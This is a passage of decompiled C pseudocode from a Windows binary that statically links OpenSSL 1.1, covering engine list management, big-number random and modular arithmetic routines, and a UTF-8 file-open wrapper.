      Block = (volatile LONG *)*((_DWORD *)v2 + 20);
    }
    if ( (int)Block <= 0 )
    {
      sub_442BE0((int)v2);
      sub_4428E0((int)v2);
      v3 = (void (__cdecl *)(volatile LONG *))*((_DWORD *)v2 + 11);
      if ( v3 )
        v3(v2);
      sub_414DC0(0xAu, (int)v2, (int **)v2 + 22);
      sub_413490((void *)v2);
    }
  }
  return 1;
}

//----- (00429F60) --------------------------------------------------------
int __cdecl sub_429F60(volatile LONG *Block)
{
  volatile LONG *v1; // esi
  void (__cdecl *v2)(volatile LONG *); // eax

  v1 = Block;
  if ( Block )
  {
    sub_4147E0(Block + 20, -1, &Block);
    if ( (int)Block <= 0 )
    {
      sub_442BE0((int)v1);
      sub_4428E0((int)v1);
      v2 = (void (__cdecl *)(volatile LONG *))*((_DWORD *)v1 + 11);
      if ( v2 )
        v2(v1);
      sub_414DC0(0xAu, (int)v1, (int **)v1 + 22);
      sub_413490((void *)v1);
    }
  }
  return 1;
}

//----- (00429FD0) --------------------------------------------------------
int __cdecl sub_429FD0(int a1)
{
  int result; // eax

  if ( dword_539024 || (dword_539024 = sub_426AF0(), result = dword_539024 != 0, dword_539024) )
  {
    result = (int)sub_4133F0(4u);
    if ( result )
    {
      *(_DWORD *)result = a1;
      return sub_4268C0((int *)dword_539024, result, 0);
    }
  }
  return result;
}

//----- (0042A020) --------------------------------------------------------
int __cdecl sub_42A020(int a1)
{
  int result; // eax

  if ( dword_539024 || (dword_539024 = sub_426AF0(), result = dword_539024 != 0, dword_539024) )
  {
    result = (int)sub_4133F0(4u);
    if ( result )
    {
      *(_DWORD *)result = a1;
      return sub_4269B0((int *)dword_539024, result);
    }
  }
  return result;
}

//----- (0042A070) --------------------------------------------------------
void __cdecl sub_42A070(void (**Block)(void))
{
  (*Block)();
  sub_413490(Block);
}

//----- (0042A090) --------------------------------------------------------
void sub_42A090()
{
  if ( dword_539024 )
  {
    sub_426C00(dword_539024, (void (__cdecl *)(_DWORD))sub_42A070);
    dword_539024 = 0;
  }
  sub_406E80(0);
  sub_4146D0(dword_73C6C0);
}

//----- (0042A0D0) --------------------------------------------------------
int __cdecl sub_42A0D0(int a1, int a2, int a3)
{
  return sub_414870((int *)(a1 + 88), a2, a3);
}

//----- (0042A0E0) --------------------------------------------------------
int __cdecl sub_42A0E0(int a1, int a2)
{
  int **v3; // [esp+4h] [ebp+4h]

  v3 = (int **)(a1 + 88);
  if ( *v3 && a2 < sub_426A30((int)*v3) )
    return sub_426A40(*v3, a2);
  else
    return 0;
}

//----- (0042A0F0) --------------------------------------------------------
int __cdecl sub_42A0F0(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = a2;
    return 1;
  }
  else
  {
    sub_408310(38, 129, 67, (int)"crypto\\engine\\eng_lib.c", 191);
    return 0;
  }
}

//----- (0042A130) --------------------------------------------------------
int __cdecl sub_42A130(int a1, int a2)
{
  if ( a2 )
  {
    *(_DWORD *)(a1 + 4) = a2;
    return 1;
  }
  else
  {
    sub_408310(38, 130, 67, (int)"crypto\\engine\\eng_lib.c", 201);
    return 0;
  }
}

//----- (0042A170) --------------------------------------------------------
int __cdecl sub_42A170(int a1, int a2)
{
  *(_DWORD *)(a1 + 48) = a2;
  return 1;
}

//----- (0042A190) --------------------------------------------------------
int __cdecl sub_42A190(int a1, int a2)
{
  *(_DWORD *)(a1 + 52) = a2;
  return 1;
}

//----- (0042A1B0) --------------------------------------------------------
int __cdecl sub_42A1B0(int a1, int a2)
{
  *(_DWORD *)(a1 + 56) = a2;
  return 1;
}

//----- (0042A1D0) --------------------------------------------------------
int __cdecl sub_42A1D0(int a1, int a2)
{
  *(_DWORD *)(a1 + 76) = a2;
  return 1;
}

//----- (0042A1F0) --------------------------------------------------------
int __cdecl sub_42A1F0(int a1, int a2)
{
  *(_DWORD *)(a1 + 72) = a2;
  return 1;
}

//----- (0042A210) --------------------------------------------------------
void *sub_42A210()
{
  return &unk_539028;
}

//----- (0042A220) --------------------------------------------------------
struct _RTL_CRITICAL_SECTION *sub_42A220()
{
  struct _RTL_CRITICAL_SECTION *result; // eax

  result = sub_414650();
  dword_73C6C0 = result;
  dword_539020 = result != 0;
  return result;
}
// 539020: using guessed type int dword_539020;

//----- (0042A240) --------------------------------------------------------
void *sub_42A240()
{
  void *v0; // esi

  if ( (sub_414700(&dword_53901C, (void (*)(void))sub_42A220) ? dword_539020 : 0) != 0 && (v0 = sub_413430(0x64u)) != 0 )
  {
    *((_DWORD *)v0 + 20) = 1;
    if ( sub_414B00(0xAu, (int)v0, (int **)v0 + 22) )
    {
      return v0;
    }
    else
    {
      sub_413490(v0);
      return 0;
    }
  }
  else
  {
    sub_408310(38, 122, 65, (int)"crypto\\engine\\eng_lib.c", 31);
    return 0;
  }
}
// 539020: using guessed type int dword_539020;

//----- (0042A2D0) --------------------------------------------------------
int __cdecl sub_42A2D0(_DWORD *a1, _DWORD *a2, int *a3, int *a4)
{
  int result; // eax
  int (__cdecl *v5)(_DWORD *, int, int); // eax

  result = sub_4299A0(0, (int)a1, a2, a3, a4);
  if ( result )
  {
    if ( a1[3] )
    {
      v5 = sub_422020;
      if ( !a3[3] )
        v5 = sub_4220E0;
      return v5(a1, (int)a1, (int)a3);
    }
    else
    {
      return 1;
    }
  }
  return result;
}

//----- (0042A320) --------------------------------------------------------
int __cdecl sub_42A320(_DWORD *a1, int a2, int a3, int *a4, int *a5)
{
  int result; // eax

  result = sub_4220E0(a1, a2, a3);
  if ( result )
    return sub_42A2D0(a1, a1, a4, a5);
  return result;
}

//----- (0042A360) --------------------------------------------------------
int __cdecl sub_42A360(_DWORD *a1, int a2, int a3, int *a4)
{
  int result; // eax

  result = sub_421EA0((int)a1, a2, a3);
  if ( result )
  {
    if ( sub_416960(a1, a4) < 0 )
      return 1;
    else
      return sub_421F50(a1, (int)a1, (int)a4);
  }
  return result;
}

//----- (0042A3B0) --------------------------------------------------------
int __cdecl sub_42A3B0(_DWORD *a1, int a2, int a3, int *a4, int *a5)
{
  int result; // eax

  result = sub_422020(a1, a2, a3);
  if ( result )
    return sub_42A2D0(a1, a1, a4, a5);
  return result;
}

//----- (0042A3F0) --------------------------------------------------------
int __cdecl sub_42A3F0(_DWORD *a1, int a2, int a3, int a4)
{
  int result; // eax

  result = sub_422020(a1, a2, a3);
  if ( result )
  {
    if ( a1[3] )
      return sub_4220E0(a1, (int)a1, a4);
    else
      return 1;
  }
  return result;
}

//----- (0042A430) --------------------------------------------------------
int __cdecl sub_42A430(_DWORD *a1, int *a2, unsigned int **a3, int *a4, int *a5)
{
  int v5; // ebx
  int *v6; // edi
  int v7; // eax

  v5 = 0;
  sub_420700(a5);
  v6 = sub_420790(a5);
  if ( v6 )
  {
    if ( a2 == (int *)a3 )
      v7 = sub_441C90(v6, a2, a5);
    else
      v7 = sub_421C20((unsigned int **)v6, (unsigned int **)a2, a3, a5);
    if ( v7 && sub_42A2D0(a1, v6, a4, a5) )
      v5 = 1;
  }
  sub_420750(a5);
  return v5;
}

//----- (0042A4B0) --------------------------------------------------------
int __cdecl sub_42A4B0(int *a1, int *a2, int *a3, int *a4)
{
  int result; // eax

  result = sub_441C90(a1, a2, a4);
  if ( result )
    return sub_4299A0(0, (int)a1, a1, a3, a4);
  return result;
}

//----- (0042A4F0) --------------------------------------------------------
int __cdecl sub_42A4F0(int **a1, int **a2, _DWORD *a3)
{
  int result; // eax

  result = sub_437AC0(a1, a2);
  if ( result )
  {
    if ( sub_4169B0(a1, a3) < 0 )
      return 1;
    else
      return sub_422020(a1, (int)a1, (int)a3);
  }
  return result;
}

//----- (0042A540) --------------------------------------------------------
int __cdecl sub_42A540(int **a1, int **a2, int a3, _DWORD *a4)
{
  int result; // eax
  int v6; // ebx
  int v7; // esi
  int v8; // [esp+8h] [ebp+4h]

  if ( a1 == a2 || (result = (int)sub_4173E0(a1, a2)) != 0 )
  {
    v6 = a3;
    if ( a3 <= 0 )
    {
      return 1;
    }
    else
    {
      while ( 1 )
      {
        v8 = sub_416F90(a1);
        v7 = sub_416F90(a4) - v8;
        if ( v7 < 0 )
          break;
        if ( v7 > v6 )
          v7 = v6;
        if ( v7 )
        {
          if ( !sub_437C10(a1, a1, v7) )
            return 0;
          v6 -= v7;
        }
        else
        {
          if ( !sub_437AC0(a1, a1) )
            return 0;
          --v6;
        }
        if ( sub_4169B0(a1, a4) >= 0 && !sub_422020(a1, (int)a1, (int)a4) )
          return 0;
        if ( v6 <= 0 )
          return 1;
      }
      sub_408310(3, 119, 110, (int)"crypto\\bn\\bn_mod.c", 174);
      return 0;
    }
  }
  return result;
}

//----- (0042A610) --------------------------------------------------------
int __cdecl sub_42A610(int a1, _DWORD *a2, int a3, int a4)
{
  int v4; // ecx
  int v5; // edi
  int v6; // ebp
  int v7; // ebx
  _BYTE *v8; // esi
  void *v10; // esp
  unsigned __int8 v11; // [esp+1Bh] [ebp-11h]
  int v12; // [esp+1Ch] [ebp-10h]
  __time64_t Time; // [esp+24h] [ebp-8h] BYREF

  v5 = 0;
  v12 = 0;
  if ( v4 < 0 )
    goto LABEL_31;
  if ( v4 != 1 )
  {
    if ( !v4 )
    {
      sub_417490(a2, 0);
      return 1;
    }
    goto LABEL_4;
  }
  if ( a3 > 0 )
  {
LABEL_31:
    sub_408310(3, 127, 118, (int)"crypto\\bn\\bn_rand.c", 24);
    return 0;
  }
LABEL_4:
  v6 = (v4 + 7) / 8;
  v7 = (v4 - 1) % 8;
  v8 = sub_4133F0(v6);
  if ( v8 )
  {
    _time64(&Time);
    v10 = alloca(8);
    sub_406F80((int)&Time, 8, 0.0);
    if ( sub_406FF0() > 0 )
    {
      if ( a1 == 2 && v6 > 0 )
      {
        while ( sub_406FF0() > 0 )
        {
          if ( v11 < 0x80u || v5 <= 0 )
          {
            if ( v11 >= 0x2Au )
            {
              if ( v11 < 0x54u )
                v8[v5] = -1;
            }
            else
            {
              v8[v5] = 0;
            }
          }
          else
          {
            v8[v5] = v8[v5 - 1];
          }
          if ( ++v5 >= v6 )
            goto LABEL_20;
        }
      }
      else
      {
LABEL_20:
        if ( a3 >= 0 )
        {
          if ( a3 )
          {
            if ( v7 )
            {
              *v8 |= 3 << (v7 - 1);
            }
            else
            {
              v8[1] |= 0x80u;
              *v8 = 1;
            }
          }
          else
          {
            *v8 |= 1 << v7;
          }
        }
        *v8 &= ~(unsigned __int8)(255 << (v7 + 1));
        if ( a4 )
          v8[v6 - 1] |= 1u;
        if ( sub_4174D0(v8, v6, (int)a2) )
          v12 = 1;
      }
    }
  }
  else
  {
    sub_408310(3, 127, 65, (int)"crypto\\bn\\bn_rand.c", 39);
  }
  sub_4134B0(v8, v6);
  return v12;
}
// 42A623: variable 'v4' is possibly undefined
// 42A715: variable 'v11' is possibly undefined

//----- (0042A7D0) --------------------------------------------------------
int __cdecl sub_42A7D0(_DWORD *a1, int a2, int a3, int a4)
{
  return sub_42A610(0, a1, a3, a4);
}

//----- (0042A7F0) --------------------------------------------------------
int __cdecl sub_42A7F0(_DWORD *a1, int a2, int a3, int a4)
{
  return sub_42A610(1, a1, a3, a4);
}

//----- (0042A810) --------------------------------------------------------
int __usercall sub_42A810@<eax>(_DWORD *a1@<edi>, _DWORD *a2@<esi>, int a3)
{
  int (__cdecl *v3)(_DWORD *, int, int, int); // ebp
  int v4; // ebx
  int v6; // ebx
  int v7; // [esp+8h] [ebp+4h]

  v3 = sub_42A7F0;
  if ( !a3 )
    v3 = sub_42A7D0;
  v7 = 100;
  if ( a1[3] || sub_416DB0((int)a1) )
  {
    sub_408310(3, 122, 115, (int)"crypto\\bn\\bn_rand.c", 117);
    return 0;
  }
  else
  {
    v4 = sub_416F90(a1);
    if ( v4 == 1 )
    {
      sub_417490(a2, 0);
      return 1;
    }
    else
    {
      if ( sub_416A50(a1, v4 - 2) || sub_416A50(a1, v4 - 3) )
      {
        while ( v3(a2, v4, -1, 0) )
        {
          if ( !--v7 )
          {
            sub_408310(3, 122, 113, (int)"crypto\\bn\\bn_rand.c", 163);
            return 0;
          }
          if ( sub_4169B0(a2, a1) < 0 )
            return 1;
        }
      }
      else
      {
        v6 = v4 + 1;
        while ( v3(a2, v6, -1, 0)
             && (sub_4169B0(a2, a1) < 0
              || sub_422020(a2, (int)a2, (int)a1) && (sub_4169B0(a2, a1) < 0 || sub_422020(a2, (int)a2, (int)a1))) )
        {
          if ( !--v7 )
          {
            sub_408310(3, 122, 113, (int)"crypto\\bn\\bn_rand.c", 150);
            return 0;
          }
          if ( sub_4169B0(a2, a1) < 0 )
            return 1;
        }
      }
      return 0;
    }
  }
}

//----- (0042A970) --------------------------------------------------------
int __cdecl sub_42A970(_DWORD *a1, _DWORD *a2)
{
  return sub_42A810(a2, a1, 0);
}

//----- (0042A990) --------------------------------------------------------
int __cdecl sub_42A990(_DWORD *a1, _DWORD *a2)
{
  return sub_42A810(a2, a1, 1);
}

//----- (0042A9B0) --------------------------------------------------------
int __cdecl sub_42A9B0(_DWORD *a1, int *a2, int a3, void *a4, size_t Size, int *a6)
{
  unsigned int v6; // edi
  _BYTE *v7; // ebp
  unsigned int v8; // esi
  size_t v9; // esi
  _DWORD *v10; // esi
  unsigned int v12; // [esp+Ch] [ebp-1D4h] BYREF
  int v13; // [esp+10h] [ebp-1D0h]
  int *v14; // [esp+14h] [ebp-1CCh]
  void *v15; // [esp+18h] [ebp-1C8h]
  int *v16; // [esp+1Ch] [ebp-1C4h]
  _DWORD *v17; // [esp+20h] [ebp-1C0h]
  int v18[54]; // [esp+24h] [ebp-1BCh] BYREF
  char v19[64]; // [esp+FCh] [ebp-E4h] BYREF
  char v20[96]; // [esp+13Ch] [ebp-A4h] BYREF
  char Src[64]; // [esp+19Ch] [ebp-44h] BYREF

  v17 = a1;
  v16 = a2;
  v15 = a4;
  v14 = a6;
  v6 = (sub_416F90(a2) + 7) / 8 + 8;
  v13 = 0;
  v7 = sub_4133F0(v6);
  if ( v7 )
  {
    v8 = 4 * *(_DWORD *)(a3 + 4);
    if ( v8 <= 0x60 )
    {
      memcpy(v20, *(const void **)a3, 4 * *(_DWORD *)(a3 + 4));
      memset(&v20[v8], 0, 96 - v8);
      v12 = 0;
      if ( v6 )
      {
        while ( sub_406FF0() == 1 )
        {
          sub_442D40(v18);
          sub_443280((int)v18, (char *)&v12, 4u);
          sub_443280((int)v18, v20, 0x60u);
          sub_443280((int)v18, (char *)v15, Size);
          sub_443280((int)v18, v19, 0x40u);
          sub_442DE0(Src, v18);
          v9 = v6 - v12;
          if ( v6 - v12 > 0x40 )
            v9 = 64;
          memcpy(&v7[v12], Src, v9);
          v12 += v9;
          if ( v12 >= v6 )
            goto LABEL_9;
        }
      }
      else
      {
LABEL_9:
        v10 = v17;
        if ( sub_4174D0(v7, v6, (int)v17) && sub_4299A0(0, (int)v10, v10, v16, v14) == 1 )
          v13 = 1;
      }
    }
    else
    {
      sub_408310(3, 140, 117, (int)"crypto\\bn\\bn_rand.c", 222);
    }
  }
  sub_413490(v7);
  return v13;
}
// 42A9B0: using guessed type char var_A4[96];
// 42A9B0: using guessed type char var_E4[64];

//----- (0042ABE0) --------------------------------------------------------
void *__cdecl sub_42ABE0(size_t Size)
{
  void *result; // eax
  void *v2; // esi

  result = sub_4133F0(Size);
  v2 = result;
  if ( result )
  {
    memset(result, 0, Size);
    return v2;
  }
  return result;
}

//----- (0042AC20) --------------------------------------------------------
int __cdecl sub_42AC20(_DWORD *a1, _DWORD *a2)
{
  return *a1 - *a2;
}

//----- (0042AC30) --------------------------------------------------------
int __cdecl sub_42AC30(int *a1, int a2, _DWORD *a3, int *a4, int a5, int a6)
{
  int *v6; // esi
  _DWORD *v7; // eax
  int v8; // ebp
  _DWORD *v10; // esi
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  volatile LONG *v13; // eax
  int v15; // [esp-10h] [ebp-2Ch]
  int v16; // [esp+8h] [ebp-14h]
  int v17[4]; // [esp+Ch] [ebp-10h] BYREF

  v16 = 0;
  sub_414690(dword_73C6C0);
  v6 = a1;
  if ( !*a1 )
  {
    v7 = sub_4245F0((int (__cdecl *)(_BYTE *))sub_435D30, (int (__cdecl *)(const char *, const char *))sub_42AC20);
    if ( !v7 )
      goto LABEL_19;
    *a1 = (int)v7;
    sub_429FD0(a2);
  }
  v8 = a5;
  if ( a5 )
  {
    while ( 1 )
    {
      v15 = *v6;
      --v8;
      v17[0] = *a4;
      v10 = sub_424780(v15, (int)v17);
      if ( !v10 )
      {
        v11 = sub_4133F0(0x10u);
        v10 = v11;
        if ( !v11 )
          goto LABEL_19;
        v11[3] = 1;
        *v11 = *a4;
        v12 = sub_426AF0();
        v10[1] = v12;
        if ( !v12 )
        {
          sub_413490(v10);
          goto LABEL_19;
        }
        v10[2] = 0;
        sub_424680((_DWORD *)*a1, (int)v10);
      }
      sub_426B00((int *)v10[1], (int)a3);
      if ( !sub_4269B0((int *)v10[1], (int)a3) )
        goto LABEL_19;
      v10[3] = 0;
      if ( a6 )
      {
        if ( !sub_416140(a3) )
        {
          sub_408310(38, 184, 109, "crypto\\engine\\eng_table.c", 125);
          goto LABEL_19;
        }
        v13 = (volatile LONG *)v10[2];
        if ( v13 )
          sub_416170(v13, 0);
        v10[2] = a3;
        v10[3] = 1;
      }
      ++a4;
      if ( !v8 )
        break;
      v6 = a1;
    }
  }
  v16 = 1;
LABEL_19:
  sub_4146B0(dword_73C6C0);
  return v16;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 42AC30: using guessed type int var_10[4];

//----- (0042ADC0) --------------------------------------------------------
void __cdecl sub_42ADC0(void ***Block)
{
  volatile LONG *v1; // eax

  if ( Block )
  {
    sub_4269F0(Block[1]);
    v1 = (volatile LONG *)Block[2];
    if ( v1 )
      sub_416170(v1, 0);
    sub_413490(Block);
  }
}

//----- (0042AE00) --------------------------------------------------------
int __cdecl sub_42AE00(LPCRITICAL_SECTION lpCriticalSection)
{
  sub_414690(dword_73C6C0);
  if ( lpCriticalSection->DebugInfo )
  {
    sub_424330(&lpCriticalSection->DebugInfo->Type, (void (__cdecl *)(_DWORD))sub_42ADC0);
    sub_424260((void **)lpCriticalSection->DebugInfo);
    lpCriticalSection->DebugInfo = 0;
  }
  return sub_4146B0(dword_73C6C0);
}

//----- (0042AE50) --------------------------------------------------------
_DWORD *__cdecl sub_42AE50(int *a1, int a2)
{
  _DWORD *v2; // esi
  int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // edi
  int v7; // ebp
  volatile LONG *v8; // eax
  int v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = 0;
  if ( !*a1 )
    return 0;
  sub_4081F0();
  sub_414690(dword_73C6C0);
  v4 = *a1;
  if ( *a1 )
  {
    v9[0] = a2;
    v5 = sub_424780(v4, (int)v9);
    v6 = v5;
    if ( v5 )
    {
      if ( v5[2] && sub_416140((_DWORD *)v5[2]) || v6[3] )
      {
        v2 = (_DWORD *)v6[2];
      }
      else
      {
        v2 = (_DWORD *)sub_426A40((int *)v6[1], 0);
        v7 = 1;
        if ( v2 )
        {
          while ( (int)v2[21] <= 0 && (byte_53902C & 1) != 0 || !sub_416140(v2) )
          {
            v2 = (_DWORD *)sub_426A40((int *)v6[1], v7++);
            if ( !v2 )
              goto LABEL_20;
          }
          if ( (_DWORD *)v6[2] != v2 && sub_416140(v2) )
          {
            v8 = (volatile LONG *)v6[2];
            if ( v8 )
              sub_416170(v8, 0);
            v6[2] = v2;
          }
        }
      }
LABEL_20:
      v6[3] = 1;
    }
  }
  sub_4146B0(dword_73C6C0);
  sub_408220();
  return v2;
}
// 53902C: using guessed type char byte_53902C;
// 42AE50: using guessed type int var_10[4];

//----- (0042AF80) --------------------------------------------------------
void __cdecl sub_42AF80(_DWORD *a1, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-8h] BYREF

  v3[0] = a2;
  v3[1] = a3;
  if ( a1 )
    sub_424370(a1, (void (__cdecl *)(_DWORD, int))sub_42AF60, (int)v3);
}
// 42AF60: using guessed type int sub_42AF60();

//----- (0042AFC0) --------------------------------------------------------
int __thiscall sub_42AFC0(volatile LONG *Block)
{
  volatile LONG *v2; // edx
  volatile LONG *v3; // eax
  int v4; // eax
  int v5; // eax

  if ( Block )
  {
    v2 = (volatile LONG *)dword_539030;
    v3 = (volatile LONG *)dword_539030;
    if ( !dword_539030 )
      goto LABEL_8;
    while ( v3 != Block )
    {
      v3 = (volatile LONG *)*((_DWORD *)v3 + 24);
      if ( !v3 )
        goto LABEL_8;
    }
    if ( v3 )
    {
      v4 = *((_DWORD *)Block + 24);
      if ( v4 )
        *(_DWORD *)(v4 + 92) = *((_DWORD *)Block + 23);
      v5 = *((_DWORD *)Block + 23);
      if ( v5 )
        *(_DWORD *)(v5 + 96) = *((_DWORD *)Block + 24);
      if ( v2 == Block )
        dword_539030 = (void *)*((_DWORD *)Block + 24);
      if ( (volatile LONG *)dword_539034 == Block )
        dword_539034 = *((_DWORD *)Block + 23);
      sub_429EE0(Block, 0);
      return 1;
    }
    else
    {
LABEL_8:
      sub_408310(38, 121, 105, (int)"crypto\\engine\\eng_list.c", 117);
      return 0;
    }
  }
  else
  {
    sub_408310(38, 121, 67, (int)"crypto\\engine\\eng_list.c", 108);
    return 0;
  }
}
// 539034: using guessed type int dword_539034;

//----- (0042B060) --------------------------------------------------------
void *sub_42B060()
{
  void *v1; // esi

  if ( (sub_414700(&dword_53901C, (void (*)(void))sub_42A220) ? dword_539020 : 0) != 0 )
  {
    sub_414690(dword_73C6C0);
    v1 = dword_539030;
    if ( dword_539030 )
      ++*((_DWORD *)dword_539030 + 20);
    sub_4146B0(dword_73C6C0);
    return v1;
  }
  else
  {
    sub_408310(38, 195, 65, "crypto\\engine\\eng_list.c", 140);
    return 0;
  }
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 539020: using guessed type int dword_539020;

//----- (0042B0D0) --------------------------------------------------------
int __cdecl sub_42B0D0(volatile LONG *Block)
{
  int v2; // esi

  if ( Block )
  {
    sub_414690(dword_73C6C0);
    v2 = *((_DWORD *)Block + 24);
    if ( v2 )
      ++*(_DWORD *)(v2 + 80);
    sub_4146B0(dword_73C6C0);
    sub_429F60(Block);
    return v2;
  }
  else
  {
    sub_408310(38, 115, 67, "crypto\\engine\\eng_list.c", 178);
    return 0;
  }
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0042B130) --------------------------------------------------------
int __cdecl sub_42B130(volatile LONG *Block)
{
  int v1; // esi

  v1 = 1;
  if ( Block )
  {
    sub_414690(dword_73C6C0);
    if ( !sub_42AFC0(Block) )
    {
      sub_408310(38, 123, 110, (int)"crypto\\engine\\eng_list.c", 245);
      v1 = 0;
    }
    sub_4146B0(dword_73C6C0);
    return v1;
  }
  else
  {
    sub_408310(38, 123, 67, (int)"crypto\\engine\\eng_list.c", 240);
    return 0;
  }
}

//----- (0042B1B0) --------------------------------------------------------
int __cdecl sub_42B1B0(_DWORD *a1)
{
  _DWORD *v1; // ecx
  int result; // eax

  *v1 = *a1;
  v1[1] = a1[1];
  v1[2] = a1[2];
  v1[3] = a1[3];
  v1[4] = a1[4];
  v1[5] = a1[5];
  v1[6] = a1[6];
  v1[7] = a1[7];
  v1[8] = a1[8];
  v1[9] = a1[9];
  v1[11] = a1[11];
  v1[12] = a1[12];
  v1[13] = a1[13];
  v1[14] = a1[14];
  v1[15] = a1[15];
  v1[16] = a1[16];
  v1[18] = a1[18];
  result = a1[19];
  v1[19] = result;
  return result;
}
// 42B1B6: variable 'v1' is possibly undefined

//----- (0042B220) --------------------------------------------------------
char *__cdecl sub_42B220(char *a1)
{
  char *v2; // esi
  char *v3; // ecx
  char *v4; // edi
  char *v5; // eax

  if ( a1 )
  {
    if ( (sub_414700(&dword_53901C, (void (*)(void))sub_42A220) ? dword_539020 : 0) != 0 )
    {
      sub_414690(dword_73C6C0);
      v2 = (char *)dword_539030;
      if ( dword_539030 )
      {
        while ( strcmp(a1, *(const char **)v2) )
        {
          v2 = (char *)*((_DWORD *)v2 + 24);
          if ( !v2 )
            goto LABEL_14;
        }
        if ( (v2[76] & 4) != 0 )
        {
          if ( sub_42A240() )
          {
            sub_42B1B0(v2);
            v2 = v3;
          }
          else
          {
            v2 = 0;
          }
        }
        else
        {
          ++*((_DWORD *)v2 + 20);
        }
      }
LABEL_14:
      sub_4146B0(dword_73C6C0);
      if ( v2 )
      {
        return v2;
      }
      else
      {
        if ( !strcmp(a1, "dynamic") )
          goto LABEL_26;
        v4 = getenv("OPENSSL_ENGINES");
        if ( !v4 )
          v4 = "C:\\openssl_lib\\lib\\engines-1_1";
        v5 = (char *)sub_42B220("dynamic");
        v2 = v5;
        if ( v5
          && sub_443780(v5, "ID", a1, 0)
          && sub_443780(v2, "DIR_LOAD", "2", 0)
          && sub_443780(v2, "DIR_ADD", v4, 0)
          && sub_443780(v2, "LIST_ADD", "1", 0)
          && sub_443780(v2, "LOAD", 0, 0) )
        {
          return v2;
        }
        else
        {
LABEL_26:
          sub_429F60((volatile LONG *)v2);
          sub_408310(38, 106, 116, (int)"crypto\\engine\\eng_list.c", 339);
          sub_408610(2, "id=", a1);
          return 0;
        }
      }
    }
    else
    {
      sub_408310(38, 106, 65, (int)"crypto\\engine\\eng_list.c", 291);
      return 0;
    }
  }
  else
  {
    sub_408310(38, 106, 67, (int)"crypto\\engine\\eng_list.c", 287);
    return 0;
  }
}
// 42B2F4: variable 'v3' is possibly undefined
// 539020: using guessed type int dword_539020;

//----- (0042B430) --------------------------------------------------------
volatile LONG *sub_42B430()
{
  volatile LONG *result; // eax

  for ( result = (volatile LONG *)dword_539030; dword_539030; result = (volatile LONG *)dword_539030 )
    sub_42B130(result);
  return result;
}

//----- (0042B460) --------------------------------------------------------
int __usercall sub_42B460@<eax>(int a1@<edi>)
{
  BOOL v1; // eax
  int result; // eax
  const char **v3; // esi
  int v4; // eax
  int v5; // eax

  v1 = 0;
  if ( !a1 )
  {
    sub_408310(38, 120, 67, (int)"crypto\\engine\\eng_list.c", 59);
    return 0;
  }
  v3 = (const char **)dword_539030;
  if ( dword_539030 )
  {
    do
    {
      if ( v1 )
        goto LABEL_7;
      v4 = strcmp(*v3, *(const char **)a1);
      v3 = (const char **)v3[24];
      v1 = v4 == 0;
    }
    while ( v3 );
    if ( v1 )
    {
LABEL_7:
      sub_408310(38, 120, 103, (int)"crypto\\engine\\eng_list.c", 68);
      return 0;
    }
    v5 = dword_539034;
    if ( dword_539034 && !*(_DWORD *)(dword_539034 + 96) )
    {
      *(_DWORD *)(dword_539034 + 96) = a1;
      *(_DWORD *)(a1 + 92) = v5;
      goto LABEL_14;
    }
    sub_408310(38, 120, 110, (int)"crypto\\engine\\eng_list.c", 86);
  }
  else
  {
    if ( !dword_539034 )
    {
      dword_539030 = (void *)a1;
      *(_DWORD *)(a1 + 92) = 0;
      sub_42A020((int)sub_42B430);
LABEL_14:
      result = 1;
      ++*(_DWORD *)(a1 + 80);
      dword_539034 = a1;
      *(_DWORD *)(a1 + 96) = 0;
      return result;
    }
    sub_408310(38, 120, 110, (int)"crypto\\engine\\eng_list.c", 74);
  }
  return 0;
}
// 539034: using guessed type int dword_539034;

//----- (0042B560) --------------------------------------------------------
int __cdecl sub_42B560(_DWORD *a1)
{
  int v1; // esi

  v1 = 1;
  if ( a1 )
  {
    if ( *a1 && a1[1] )
    {
      sub_414690(dword_73C6C0);
      if ( !sub_42B460((int)a1) )
      {
        sub_408310(38, 105, 110, (int)"crypto\\engine\\eng_list.c", 228);
        v1 = 0;
      }
      sub_4146B0(dword_73C6C0);
      return v1;
    }
    else
    {
      sub_408310(38, 105, 108, (int)"crypto\\engine\\eng_list.c", 223);
      return 0;
    }
  }
  else
  {
    sub_408310(38, 105, 67, (int)"crypto\\engine\\eng_list.c", 219);
    return 0;
  }
}

//----- (0042B600) --------------------------------------------------------
FILE *__cdecl sub_42B600(LPCCH lpMultiByteStr, const CHAR *a2)
{
  unsigned int v2; // kr00_4
  int v3; // esi
  void *v5; // esp
  const char *v6; // edi
  const char *v7; // esi
  FILE *v8; // ebx
  WCHAR v9[6]; // [esp+0h] [ebp-30h] BYREF
  wchar_t *FileName; // [esp+Ch] [ebp-24h]
  DWORD dwFlags; // [esp+10h] [ebp-20h]
  LPCCH v12; // [esp+14h] [ebp-1Ch]
  LPCCH v13; // [esp+18h] [ebp-18h]
  WCHAR WideCharStr[8]; // [esp+1Ch] [ebp-14h] BYREF

  v12 = a2;
  v13 = lpMultiByteStr;
  v2 = strlen(lpMultiByteStr);
  dwFlags = 8;
  v3 = MultiByteToWideChar(0xFDE9u, 8u, lpMultiByteStr, v2 + 1, 0, 0);
  if ( v3 <= 0 )
  {
    if ( GetLastError() != 1004 || (dwFlags = 0, v3 = MultiByteToWideChar(0xFDE9u, 0, v13, v2 + 1, 0, 0), v3 <= 0) )
    {
      if ( GetLastError() == 1113 )
        return fopen(v13, v12);
      return 0;
    }
  }
  v5 = alloca(2 * v3);
  v6 = v13;
  FileName = v9;
  if ( !MultiByteToWideChar(0xFDE9u, dwFlags, v13, v2 + 1, v9, v3) )
    return 0;
  v7 = v12;
  if ( !MultiByteToWideChar(0xFDE9u, 0, v12, strlen(v12) + 1, WideCharStr, 8) )
    return 0;
  v8 = _wfopen(FileName, WideCharStr);
  if ( !v8 && (*_errno() == 2 || *_errno() == 9) )
    return fopen(v6, v7);
  else
    return v8;
}

//----- (0042B790) --------------------------------------------------------
int __cdecl sub_42B790(_BYTE *a1)
{
  if ( a1 )
  {
    if ( *(_DWORD *)a1 )
    {
